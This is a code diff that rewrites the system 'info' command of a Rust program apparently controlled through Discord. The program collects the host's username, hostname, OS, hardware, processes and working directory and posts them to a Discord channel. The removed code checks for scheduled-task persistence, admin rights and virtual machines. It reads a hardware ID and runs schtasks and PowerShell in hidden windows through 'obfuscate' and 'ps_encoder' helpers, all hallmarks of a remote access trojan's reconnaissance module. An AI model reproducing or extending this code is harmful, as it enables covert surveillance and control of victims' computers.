@@ -1,354 +1,102 @@
-use crate::utils::cpuid::CpuId;
-use crate::commands::*;
-use crate::system_info::DeviceInfo;
-use anyhow::Result;
-use async_trait::async_trait;
-use std::os::windows::process::CommandExt;
-use std::process::Command;
-use sysinfo::{CpuExt, DiskExt, System, SystemExt};
-use twilight_http::Client as HttpClient;
-use twilight_model::channel::message::embed::EmbedFooter;
-use twilight_model::channel::message::Message;
-use twilight_util::builder::embed::EmbedBuilder;
-use crate::utils::ps_encoder::{ run_encoded_string, scripts };
+use crate::prelude::*;
+use sysinfo::{System, Disks};
+use std::env;
 
-pub struct InfoCommand;
+#[poise::command(prefix_command, aliases("about", "sysinfo"))]
+pub async fn info(ctx: PoiseContext<'_>) -> Result<(), Error> {
+    let reply = ctx.say("Gathering system info...").await?;
 
-#[async_trait]
-impl BotCommand for InfoCommand {
-    fn name(&self) -> &str {
-        "info"
-    }
-    fn description(&self) -> &str {
-        "Display information about the bot system"
-    }
-    fn category(&self) -> &str {
-        "core"
-    }
-    fn usage(&self) -> &str {
-        ".info"
-    }
-    fn examples(&self) -> &'static [&'static str] {
-        &[".info"]
-    }
-    fn aliases(&self) -> &'static [&'static str] {
-        &["about", "botinfo"]
-    }
+    let result = tokio::task::spawn_blocking(|| {
+        let mut sys = System::new_all();
+        sys.refresh_all();
 
-    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
-        let mut sys = System::new();
-        sys.refresh_cpu();
-        sys.refresh_memory();
-        sys.refresh_disks_list();
-        for disk in sys.disks_mut() {
-            disk.refresh();
-        }
+        let hostname = System::host_name().unwrap_or("Unknown".to_string());
+        let os = System::name().unwrap_or("Windows".to_string());
+        let os_version = System::os_version().unwrap_or_default();
+        let kernel = System::kernel_version().unwrap_or_default();
+        let username = env::var("USERNAME").unwrap_or("Unknown".to_string());
 
-        let device_info = DeviceInfo::new().unwrap_or(DeviceInfo {
-            username: "Unknown".to_string(),
-            hostname: "Unknown".to_string(),
-            os: "Unknown".to_string(),
-            os_version: "Unknown".to_string(),
-            architecture: "Unknown".to_string(),
-            device_id: "Unknown".to_string(),
-            hardware_id: "Unknown".to_string(),
-            admin_status: false,
-            current_directory: "Unknown".to_string(),
-        });
+        let cpu_name = sys.cpus().first()
+            .map(|c| c.brand().to_string())
+            .unwrap_or("Unknown".to_string());
+        let cpu_cores = sys.cpus().len();
+        let cpu_usage: f32 = sys.cpus().iter().map(|c| c.cpu_usage()).sum::<f32>() / cpu_cores as f32;
 
-        let cpu_info = CpuId::get();
-        let cpu_name = &cpu_info.brand;
-        let cpu_cores = cpu_info.cores;
-        let cpu_threads = cpu_info.threads;
-        let cpu_features = cpu_info.features.to_string_list().join(", ");
-        let is_vm = cpu_info.features.hypervisor;
+        let total_mem = sys.total_memory();
+        let used_mem = sys.used_memory();
+        let mem_percent = (used_mem as f64 / total_mem as f64 * 100.0) as u32;
 
-        let gpu_info = run_encoded_string(&scripts::get_gpu_info())?; // let gpu_info = InfoCommand::get_gpu_info();
-        let startup_status = InfoCommand::check_startup_status();
-
-        let system_uptime = sys.uptime();
-        let uptime_hours = system_uptime / 3600;
-        let uptime_minutes = (system_uptime % 3600) / 60;
-
-        let total_memory_gb = sys.total_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
-        let used_memory_gb = sys.used_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
-        let available_memory_gb = sys.available_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
-        let memory_usage_percent = (used_memory_gb / total_memory_gb) * 100.0;
-
-        let avg_cpu_usage = if !sys.cpus().is_empty() {
-            sys.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / sys.cpus().len() as f32
-        } else {
-            0.0
-        };
-
+        let disks = Disks::new_with_refreshed_list();
         let mut disk_info = String::new();
-        for (i, disk) in sys.disks().iter().enumerate() {
-            if i >= 3 {
-                break;
-            }
-            let total_gb = disk.total_space() as f64 / (1024.0 * 1024.0 * 1024.0);
-            let available_gb = disk.available_space() as f64 / (1024.0 * 1024.0 * 1024.0);
-            let used_gb = total_gb - available_gb;
-            let usage_percent = (used_gb / total_gb) * 100.0;
-
+        for disk in disks.iter() {
+            let total = disk.total_space();
+            let available = disk.available_space();
+            let used = total - available;
+            let percent = (used as f64 / total as f64 * 100.0) as u32;
+            let mount = disk.mount_point().to_string_lossy();
             disk_info.push_str(&format!(
-                "**{}:** {:.1}GB/{:.1}GB ({:.1}%)\n",
-                disk.mount_point().display(),
-                used_gb,
-                total_gb,
-                usage_percent
+                "{}: {:.1}GB / {:.1}GB ({}%)\n",
+                mount,
+                used as f64 / 1024.0 / 1024.0 / 1024.0,
+                total as f64 / 1024.0 / 1024.0 / 1024.0,
+                percent
             ));
         }
         if disk_info.is_empty() {
-            disk_info = "No disk information available".to_string();
+            disk_info = "No disks found".to_string();
         }
 
-        let process_count = crate::utils::syscall::get_process_list().len();
-        let vm_status = if is_vm { " [VM]" } else { "" };
+        let uptime_secs = System::uptime();
+        let hours = uptime_secs / 3600;
+        let mins = (uptime_secs % 3600) / 60;
+        let uptime_str = format!("{}h {}m", hours, mins);
 
-        let embed = EmbedBuilder::new()
-            .description(format!(
-                "**System Information**\n\n\
-                **System**\n\
-                • Host: {}{}\n\
-                • OS: {}\n\
-                • User: {} ({})\n\
-                • Directory: {}\n\n\
-                **CPU**\n\
-                • Model: {}\n\
-                • Cores: {} / Threads: {}\n\
-                • Features: {}\n\
-                • Usage: {:.1}%\n\
-                • Uptime: {}h {}m\n\n\
-                **Memory**\n\
-                • Total: {:.2} GB\n\
-                • Used: {:.2} GB ({:.1}%)\n\
-                • Available: {:.2} GB\n\n\
-                **Graphics**\n\
-                {}\n\n\
-                **Storage**\n\
-                {}\n\n\
-                **Status**\n\
-                • Processes: {}\n\
-                • Admin: {}\n\
-                • Startup: {}",
-                device_info.hostname,
-                vm_status,
-                device_info.os_version,
-                device_info.username,
-                if device_info.admin_status {
-                    "Administrator"
-                } else {
-                    "Standard User"
-                },
-                device_info
-                    .current_directory
-                    .chars()
-                    .take(50)
-                    .collect::<String>()
-                    + if device_info.current_directory.len() > 50 {
-                        "..."
-                    } else {
-                        ""
-                    },
-                cpu_name.chars().take(50).collect::<String>()
-                    + if cpu_name.len() > 50 { "..." } else { "" },
-                cpu_cores,
-                cpu_threads,
-                if cpu_features.is_empty() {
-                    "N/A".to_string()
-                } else {
-                    cpu_features
-                },
-                avg_cpu_usage,
-                uptime_hours,
-                uptime_minutes,
-                total_memory_gb,
-                used_memory_gb,
-                memory_usage_percent,
-                available_memory_gb,
-                gpu_info,
-                disk_info,
-                process_count,
-                if device_info.admin_status {
-                    "Yes"
-                } else {
-                    "No"
-                },
-                startup_status
-            ))
-            .footer(EmbedFooter {
-                text: format!(
-                    "v0.3.0 • HWID: {} • {}",
-                    device_info.hardware_id.chars().take(8).collect::<String>(),
-                    cpu_info.vendor
-                ),
-                icon_url: None,
-                proxy_icon_url: None,
-            })
-            .build();
+        let process_count = sys.processes().len();
+        let cwd = env::current_dir()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or("Unknown".to_string());
 
-        http.create_message(msg.channel_id).embeds(&[embed]).await?;
+        (
+            hostname, username, os, os_version, kernel,
+            cpu_name, cpu_cores, cpu_usage,
+            total_mem, used_mem, mem_percent,
+            disk_info, uptime_str, process_count, cwd
+        )
+    }).await;
 
-        Ok(())
-    }
-}
-
-impl InfoCommand {
-    fn check_startup_status() -> String {
-        use crate::config::Config;
-        use crate::utils::obfuscate::exe;
-        use std::os::windows::process::CommandExt;
-
-        let startup_config = Config::get_startup_config();
-
-        if !startup_config.enabled {
-            return "Disabled".to_string();
+    let (
+        hostname, username, os, os_version, kernel,
+        cpu_name, cpu_cores, cpu_usage,
+        total_mem, used_mem, mem_percent,
+        disk_info, uptime_str, process_count, cwd
+    ) = match result {
+        Ok(r) => r,
+        Err(e) => {
+            reply.edit(ctx, poise::CreateReply::default()
+                .content(format!("Error: {}", e))).await?;
+            return Ok(());
         }
+    };
 
-        let task_name = startup_config.task_name;
+    let embed = serenity::CreateEmbed::new()
+        .title(format!("{} @ {}", username, hostname))
+        .field("OS", format!("{} {}", os, os_version), true)
+        .field("Kernel", kernel, true)
+        .field("Uptime", uptime_str, true)
+        .field("CPU", format!("{}\n{} cores, {:.1}%", cpu_name, cpu_cores, cpu_usage), false)
+        .field("Memory", format!(
+            "{:.1} GB / {:.1} GB ({}%)",
+            used_mem as f64 / 1024.0 / 1024.0 / 1024.0,
+            total_mem as f64 / 1024.0 / 1024.0 / 1024.0,
+            mem_percent
+        ), true)
+        .field("Processes", process_count.to_string(), true)
+        .field("Disks", format!("```\n{}```", disk_info.trim()), false)
+        .field("CWD", format!("`{}`", cwd), false)
+        .color(0x5865F2)
+        .footer(serenity::CreateEmbedFooter::new("Kurinium"));
 
-        match Command::new(exe::schtasks())
-            .args(["/query", "/tn", &task_name, "/fo", "LIST"])
-            .creation_flags(0x08000000)
-            .output()
-        {
-            Ok(output) => {
-                if output.status.success() {
-                    let stdout = String::from_utf8_lossy(&output.stdout);
-                    if stdout.contains(&task_name) {
-                        "Active".to_string()
-                    } else {
-                        "Not Found".to_string()
-                    }
-                } else {
-                    let stderr = String::from_utf8_lossy(&output.stderr);
-                    if stderr.contains("ERROR: The system cannot find") {
-                        "Not Found".to_string()
-                    } else {
-                        format!("Error: {}", stderr.lines().next().unwrap_or("Unknown"))
-                    }
-                }
-            }
-            Err(e) => format!("Check Failed: {}", e),
-        }
-    }
+    reply.edit(ctx, poise::CreateReply::default().content("").embed(embed)).await?;
 
-    fn get_gpu_info() -> String {
-        if cfg!(target_os = "windows") {
-            let mut gpus = Vec::new();
-
-            if let Ok(output) = Command::new("wmic")
-                .args([
-                    "path",
-                    "win32_VideoController",
-                    "get",
-                    "Name,AdapterRAM",
-                    "/format:list",
-                ])
-                .creation_flags(0x08000000)
-                .output()
-            {
-                if output.status.success() {
-                    let result = String::from_utf8_lossy(&output.stdout);
-                    let mut current_gpu_name = String::new();
-                    let mut current_gpu_memory = String::new();
-
-                    for line in result.lines() {
-                        if line.starts_with("Name=") && !line.ends_with("=") {
-                            current_gpu_name =
-                                line.strip_prefix("Name=").unwrap_or("").trim().to_string();
-                        } else if line.starts_with("AdapterRAM=") && !line.ends_with("=") {
-                            if let Ok(memory_bytes) = line
-                                .strip_prefix("AdapterRAM=")
-                                .unwrap_or("0")
-                                .parse::<u64>()
-                            {
-                                if memory_bytes > 0 {
-                                    current_gpu_memory = format!(
-                                        "{:.1}GB",
-                                        memory_bytes as f64 / (1024.0 * 1024.0 * 1024.0)
-                                    );
-                                }
-                            }
-
-                            if !current_gpu_name.is_empty()
-                                && !current_gpu_name.to_lowercase().contains("microsoft")
-                                && !current_gpu_name.to_lowercase().contains("remote")
-                            {
-                                let memory_info = if !current_gpu_memory.is_empty() {
-                                    format!(" ({})", current_gpu_memory)
-                                } else {
-                                    String::new()
-                                };
-
-                                gpus.push(format!(
-                                    "{}{}",
-                                    current_gpu_name.chars().take(35).collect::<String>()
-                                        + if current_gpu_name.len() > 35 {
-                                            "..."
-                                        } else {
-                                            ""
-                                        },
-                                    memory_info
-                                ));
-                            }
-
-                            current_gpu_name.clear();
-                            current_gpu_memory.clear();
-                        }
-                    }
-                }
-            }
-
-            if !gpus.is_empty() {
-                return format!(
-                    "**GPU{}:** {}",
-                    if gpus.len() > 1 { "s" } else { "" },
-                    gpus.join("\n")
-                );
-            }
-
-            // Fallback to PowerShell if wmic fails
-            if let Ok(output) = {
-                use crate::utils::obfuscate::{exe, powershell as ps};
-                Command::new(exe::powershell())
-                    .args([&ps::command(), "Get-WmiObject -Class Win32_VideoController | Select-Object Name, AdapterRAM | Format-List"])
-                    .creation_flags(0x08000000)
-                    .output()
-            } {
-                if output.status.success() {
-                    let result = String::from_utf8_lossy(&output.stdout);
-                    let mut gpu_names = Vec::new();
-
-                    for line in result.lines() {
-                        if line.trim().starts_with("Name") && line.contains(':') {
-                            if let Some(name) = line.split(':').nth(1) {
-                                let gpu_name = name.trim().to_string();
-                                if !gpu_name.is_empty()
-                                    && !gpu_name.to_lowercase().contains("microsoft")
-                                    && !gpu_name.to_lowercase().contains("remote")
-                                {
-                                    gpu_names.push(
-                                        gpu_name.chars().take(35).collect::<String>()
-                                            + if gpu_name.len() > 35 { "..." } else { "" },
-                                    );
-                                }
-                            }
-                        }
-                    }
-
-                    if !gpu_names.is_empty() {
-                        return format!(
-                            "**GPU{}:** {}",
-                            if gpu_names.len() > 1 { "s" } else { "" },
-                            gpu_names.join("\n")
-                        );
-                    }
-                }
-            }
-        }
-
-        "**GPU:** Not detected".to_string()
-    }
+    Ok(())
 }
